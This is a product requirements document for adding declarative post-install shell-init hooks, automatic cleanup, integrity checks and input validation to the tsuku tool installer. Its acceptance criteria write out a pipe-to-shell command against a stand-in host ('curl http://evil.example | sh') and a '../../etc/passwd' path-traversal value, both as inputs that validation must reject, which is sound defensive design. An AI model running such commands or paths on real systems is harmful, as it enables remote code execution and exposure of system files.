---
status: Accepted
problem: |
  Tsuku installs tools by downloading pre-built binaries and symlinking them, but
  tools that need shell integration, completions, environment setup, or cleanup on
  removal get an incomplete installation. At least 8-12 tools in the registry
  (direnv, zoxide, asdf, mise, niwa) can't provide their core functionality without
  post-install shell setup that tsuku currently can't perform. Users must manually
  configure their shell after every install, and uninstalling leaves stale artifacts
  behind.
goals: |
  Tools installed via tsuku work fully out of the box -- shell integration, completions,
  and environment setup happen automatically at install time and are cleaned up on
  removal. Recipe authors can declare lifecycle behavior using the same familiar TOML
  format, and users don't need to add anything beyond their existing tsuku shellenv
  eval line.
---

# PRD: Tool Lifecycle Hooks

## Status

Draft

## Problem Statement

Tsuku's install flow is binary-focused: download, extract, symlink, verify. This
works for standalone CLI tools but falls short for tools that need deeper
integration with the user's shell environment.

Niwa, for example, requires an `eval "$(niwa shell-init bash)"` line in the user's
shell config to provide its core workspace-navigation feature. When installed via
tsuku, this setup doesn't happen -- the user gets a binary but not the shell
function wrapper that makes it useful. The same gap affects direnv (environment
switching), zoxide (smart cd), mise (dev tool version management), and others.

A survey of tsuku's 1,400 recipes found:
- 8-12 tools that **cannot function** without post-install shell integration
- 200+ tools that would benefit from automatic completion registration
- 10-20 tools with service/daemon components that need post-install setup

Beyond installation, there's no cleanup mechanism. When a user runs `tsuku remove`,
the tool directory and symlinks are deleted, but any shell.d init scripts,
completions, or environment files the tool may have created (manually) are
left behind.

The problem matters now because niwa's shell-integration design
(tsukumogami/niwa#39) explicitly deferred tsuku generalization, noting that no
mechanism exists. Adding lifecycle hooks unblocks niwa and every other tool in the
same category.

## Goals

1. Tools that need shell integration work properly after `tsuku install` with no
   manual shell configuration
2. Removing a tool cleans up everything it created outside its tool directory
3. Updating a tool preserves shell integration without gaps or stale artifacts
4. Recipe authors can declare lifecycle behavior in a few lines of TOML
5. Existing recipes and user workflows are unaffected (full backward compatibility)
6. Shell startup time impact from per-tool integration stays under 5ms

## User Stories

**As a developer installing niwa via tsuku**, I want niwa's shell function wrapper
to be automatically available in my next shell session, so that I can use
`niwa create` and `niwa go` without manually editing my .bashrc.

**As a developer installing direnv via tsuku**, I want direnv's shell hook to
activate automatically, so that `.envrc` files are loaded when I cd into a
project directory.

**As a developer removing a tool**, I want tsuku to clean up shell init scripts
and completions the tool created, so that my shell environment stays tidy and I
don't get errors from stale references.

**As a developer updating a tool**, I want the update to refresh shell integration
seamlessly, so that if the tool's init output changes between versions, my shell
picks up the new version without manual intervention or a gap where the tool
doesn't work.

**As a recipe author**, I want to declare that my tool needs shell integration by
adding a few lines to the existing `[[steps]]` array, so that I don't need to
learn a new configuration format or maintain separate hook scripts.

**As an existing tsuku user**, I want lifecycle hooks to work automatically through
my existing `eval "$(tsuku shellenv)"` line, so that I don't need to modify my
shell configuration.

**As a security-conscious developer**, I want to see which installed tools modify
my shell environment and opt out of shell integration for specific tools, so that
I can make informed trust decisions about what runs in my shell.

## Recipe Example

To ground the requirements, here's what a lifecycle-hook-enabled recipe looks like
for two representative tools.

**niwa** (generates init via its own binary -- `source_command` variant):

```toml
[metadata]
name = "niwa"
description = "Workspace manager CLI"

[version]
source = "github_releases"
github_repo = "tsukumogami/niwa"

[[steps]]
action = "github_archive"
repo = "tsukumogami/niwa"
asset_pattern = "niwa-v{version}-{os}-{arch}.tar.gz"
archive_format = "tar.gz"
strip_dirs = 1
binaries = ["niwa"]

[[steps]]
action = "install_shell_init"
phase = "post-install"
source_command = "niwa shell-init {shell}"
target = "niwa"
shells = ["bash", "zsh", "fish"]

[verify]
command = "niwa --version"
pattern = "{version}"
```

**direnv** (ships pre-built init scripts in the archive -- `source_file` variant):

```toml
[metadata]
name = "direnv"
description = "Environment switcher for the shell"

[version]
source = "github_releases"
github_repo = "direnv/direnv"

[[steps]]
action = "github_file"
repo = "direnv/direnv"
asset_pattern = "direnv.{os}-{arch}"
binaries = ["direnv"]

[[steps]]
action = "install_shell_init"
phase = "post-install"
source_file = "contrib/direnv.bash"
target = "direnv"
shells = ["bash"]

[[steps]]
action = "install_shell_init"
phase = "post-install"
source_file = "contrib/direnv.zsh"
target = "direnv"
shells = ["zsh"]

[verify]
command = "direnv version"
pattern = "{version}"
```

The key additions are the `install_shell_init` steps with `phase = "post-install"`.
Everything else in the recipe is unchanged. The `source_command` variant calls the
tool's binary at install time to generate shell-specific output. The `source_file`
variant copies static files from the downloaded archive -- safer (content is
reviewable) but requires the upstream project to ship init scripts in its release.

After `tsuku install niwa`, the user's next shell session automatically has niwa's
shell function wrapper active -- no manual `.bashrc` editing.

Note that recipes don't declare uninstall steps. Cleanup is automatic: when
`install_shell_init` runs, it records what it created (e.g.,
`share/shell.d/niwa.bash`) in the tool's state. When the user runs
`tsuku remove niwa`, tsuku reads those recorded paths and deletes them -- no recipe
involvement needed. This is why R5 requires cleanup state tracking at install time.

## Requirements

### Functional

**R1. Post-install phase.** The recipe system must support steps that execute after
the main install sequence completes and the tool binary is available at its final
install path.

**R2. Shell init installation.** A post-install action must be able to produce
per-tool shell initialization scripts via two methods: (a) running the tool's own
installed binary to generate init output (`source_command`), or (b) copying a
static file from the tool's install directory (`source_file`). Scripts must be
produced per shell type (bash, zsh, and fish). `source_file` must be validated
to resolve within the tool's install directory after symlink resolution.

**R3. Shell init delivery.** Per-tool shell init scripts must be combined into a
single cached file per shell type and automatically sourced through the existing
`tsuku shellenv` mechanism. The cache must be rebuilt atomically on every install,
remove, or update that modifies shell init scripts. No additional lines in the
user's shell configuration are required.

**R4. Cleanup on removal.** When a tool is removed via `tsuku remove`, all
artifacts created by its lifecycle hooks (shell init scripts, completions, etc.)
must be cleaned up automatically.

**R5. Cleanup state tracking.** Cleanup instructions must be recorded at install
time so that removal works without needing access to the recipe registry or
network.

**R6. Update continuity.** When a tool is updated via `tsuku update`, shell
integration must transition from old version to new version without a gap where
the tool's shell features are unavailable.

**R7. Stale artifact cleanup on update.** If an updated version produces different
shell integration artifacts than the previous version, the old artifacts must be
removed.

**R8. Backward compatibility.** Existing recipes without lifecycle hooks must
continue to work exactly as before. The feature must be purely additive to the
recipe schema.

**R9. Graceful failure.** If a lifecycle hook fails (e.g., the tool binary can't
generate its init script), the failure must not block the overall install or
remove operation. The tool should still be installed/removed, with a warning about
the hook failure.

**R10. Multi-version safety.** When multiple versions of the same tool are
installed simultaneously, removing one version must not delete shell integration
artifacts whose cleanup path also appears in another installed version's cleanup
state. Cleanup paths are compared as stored strings; if two versions record the
same path, the file is preserved until the last version referencing it is removed.

**R14. Error isolation in cache.** A syntax error or failure in one tool's init
script must not prevent other tools' init scripts from loading or break the user's
shell session. Each tool's content in the combined cache must be isolated so that
one tool's failure is contained.

**R15. Content integrity.** The SHA-256 hash of each shell init file must be
recorded at write time and verified during cache rebuild. If a file's content
doesn't match its stored hash, the cache rebuild must log a warning and exclude
the tampered file.

**R16. Opt-out flag.** `tsuku install --no-shell-init` must install the tool
without executing shell init hooks. The tool binary is installed normally; only
shell.d file creation is skipped.

**R17. Shell integration visibility.** `tsuku info <tool>` must indicate whether
a tool has shell integration hooks. Users must be able to discover which installed
tools modify their shell environment.

**R18. Diagnostic checks.** `tsuku doctor` must verify shell.d health: cache
freshness (files match cache content), content hash integrity, symlink detection
(shell.d entries must be regular files), and list active shell init scripts with
their source tools.

**R19. Update diff visibility.** When `tsuku update` runs shell init hooks and the
generated output differs from the previously stored content, tsuku must log the
change so the user can see what changed in their shell integration.

**R20. Input validation.** The `source_command` parameter must be invoked via exec
(not through a shell), preventing shell metacharacter injection. The `shells`
parameter must be validated against a fixed allowlist (bash, zsh, fish). The
`source_command` must invoke the tool's own installed binary, not arbitrary
commands.

### Non-Functional

**R11. Shell startup performance.** The incremental shell startup cost from
per-tool init sourcing must stay under 5ms (measured as wall time for sourcing
the combined init content, excluding the `tsuku shellenv` binary invocation).

**R12. Declarative trust model.** Lifecycle hooks must use a limited vocabulary of
declarative actions (not arbitrary shell scripts) to preserve tsuku's current
security posture of no post-install code execution beyond the tool's own binary.

**R13. Recipe authoring simplicity.** Adding lifecycle hooks to a recipe must
require no more than 5 additional lines of TOML using the same `[[steps]]`
format recipe authors already know.

## Acceptance Criteria

- [ ] `tsuku install niwa` (with a lifecycle-hook-enabled recipe) results in
  `niwa shell-init` output being sourced in new bash and zsh sessions via
  `eval "$(tsuku shellenv)"`, with no manual shell configuration
- [ ] `tsuku remove niwa` deletes all shell init files created by the install,
  and new shell sessions no longer source niwa's init
- [ ] `tsuku update niwa` transitions shell integration to the new version
  without a window where niwa's shell function is unavailable
- [ ] After `tsuku update`, if the new version's init output differs from the
  old version, old shell.d files not produced by the new version are deleted
- [ ] A recipe with no `phase` field on any step works identically to today
  (backward compatibility)
- [ ] If niwa's binary fails to produce shell-init output during post-install,
  the install still succeeds with a warning, and the binary is usable via its
  full path
- [ ] With 10 tools providing shell init, sourcing the combined init content
  adds less than 5ms to shell startup
- [ ] When niwa v1 and v2 are both installed, removing v1 does not delete shell
  init files that v2 also references
- [ ] `tsuku remove niwa` succeeds and cleans up shell.d files even when the
  device is offline (no registry access needed)
- [ ] Adding shell init to a recipe requires only adding a `[[steps]]` entry
  with `phase`, `action`, and 1-2 action-specific parameters
- [ ] A recipe using `source_file` (static file variant) with a path that
  resolves outside the tool's install directory (e.g., `../../etc/passwd`) is
  rejected during recipe validation
- [ ] A recipe with `source_command = "curl http://evil.example | sh"` fails
  validation (command must invoke the tool's own binary, not arbitrary commands)
- [ ] A syntax error in one tool's shell init script does not prevent other
  tools' init scripts from loading in new shell sessions
- [ ] `tsuku install --no-shell-init niwa` installs niwa's binary without
  creating shell.d files; `tsuku shellenv` output does not source niwa init
- [ ] `tsuku info niwa` (with lifecycle-hook-enabled recipe) indicates that
  niwa has shell integration
- [ ] `tsuku doctor` reports shell.d status: lists active init scripts,
  detects cache staleness, and flags hash mismatches or symlinks in shell.d/
- [ ] If a shell.d file is modified after install (content hash mismatch),
  cache rebuild logs a warning and excludes the tampered file
- [ ] When `tsuku update niwa` produces different init output than the previous
  version, the change is logged

## Out of Scope

- **Imperative hook scripts**: Only declarative actions with a limited vocabulary
  are in scope. Arbitrary shell script hooks (Level 2) are a future extension.
- **Service/daemon registration**: Post-install hooks for systemd/launchd service
  setup are deferred. The phase infrastructure supports them but specific actions
  are not part of this PRD.
- **Man page installation**: Deferred to a future lifecycle action.
- **Config file scaffolding**: Tools that need initial config files (.prettierrc,
  .editorconfig) are not covered. Users create these manually.
- **Completion installation action**: The `install_completions` action is deferred.
  The phase infrastructure supports it, but specific requirements for completions
  are not part of this PRD. A follow-up PRD can add it once shell init is proven.
- **Completion generation from tools that don't support it**: Inferring
  completions for tools without native support is out of scope.
- **Pre-remove and pre-update recipe steps**: The phase field accepts `pre-remove`
  and `pre-update` values (parser recognizes them), but no recipe actions are
  defined for these phases in this PRD. Cleanup is state-driven, not recipe-driven.
  Recipe-declared pre-remove/pre-update actions are a future extension.
- **Changes to niwa's shell-integration design**: Niwa owns its own shell-init
  subcommand. This PRD covers tsuku's mechanism for invoking and delivering it.

## Known Limitations

- Tools installed before this feature ships will have no cleanup state. Removing
  them behaves as today (directory deletion only). Users can run
  `tsuku reinstall <tool>` to populate cleanup state.
- The `source_command` variant (running the tool binary to generate init scripts)
  introduces a trust model shift: the tool's runtime output becomes part of the
  user's shell environment. This is a deliberate trade-off documented in the
  downstream design doc's security considerations.
- Shell init takes effect in new shell sessions, not the current one. Users must
  open a new terminal or re-source their shell config after installing a tool
  with shell integration.

## Decisions and Trade-offs

- **Declarative-only hooks (Level 1) over imperative scripts**: The exploration's
  security research showed that tsuku's no-post-install-code-execution model is a
  genuine advantage. Declarative actions preserve this while covering the
  identified use cases. Imperative hooks can be added later if declarative proves
  insufficient.
- **State-tracked cleanup over recipe-consulted cleanup**: Storing cleanup
  instructions at install time makes removal work without network or registry
  access. Recipe-consulted cleanup was rejected because it introduces version skew
  (the recipe available at remove time may differ from what was installed).
- **Single `[[steps]]` array with phase field over separate arrays per phase**:
  Keeps the recipe format familiar. Separate `[[post_install_steps]]` arrays were
  rejected because they scale poorly (each new phase adds another top-level array)
  and break the mental model recipe authors have.

## Downstream Artifacts

- Design: `docs/designs/current/DESIGN-tool-lifecycle-hooks.md` (Proposed)
